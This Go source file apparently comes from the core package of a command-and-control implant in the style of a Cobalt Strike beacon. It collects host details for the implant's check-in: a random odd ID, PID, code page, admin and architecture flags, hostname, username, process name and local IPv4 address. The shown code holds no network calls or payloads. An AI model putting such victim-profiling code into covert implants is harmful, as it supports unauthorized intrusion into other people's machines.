package core

import (
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
)

func GetID() int {
	Num := RandInt(100000000, 2147000000)
	if (Num & 1) == 0 {
		Num += 1
	}
	return Num
}

func GetPID() int {
	return os.Getpid()
}

func GetOEM() int {
	if runtime.GOOS == "windows" {
		return 936
	}
	return 65001
}

func GetFlag() int {
	Num := 0
	if os.Getuid() == 0 {
		Num += 8
	}
	if 32<<(^uint(0)>>63) == 64 {
		Num += 4
	}
	if strings.Contains(runtime.GOARCH, "64") {
		Num += 2
	}
	return Num
}

func GetComputer() string {
	Computer, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return Computer
}

func GetUserName() string {
	User, err := user.Current()
	if err != nil { return "unknown" }
	if strings.Contains(User.Username, "\\") {
		return strings.SplitN(User.Username, "\\", 2)[1]
	}
	return User.Username
}

func GetProcess() string {
	return filepath.Base(os.Args[0])
}

func GetIPAddress() []byte {
	Addrs, _ := net.InterfaceAddrs()
	for _, Address := range Addrs {
		IPNet, _ := Address.(*net.IPNet)
		if !IPNet.IP.IsLoopback() && !IPNet.IP.IsLinkLocalUnicast() && IPNet.IP.To4() != nil {
			return BigToLittle(IPNet.IP.To4())
		}
	}
	return []byte{0, 0, 0, 0}
}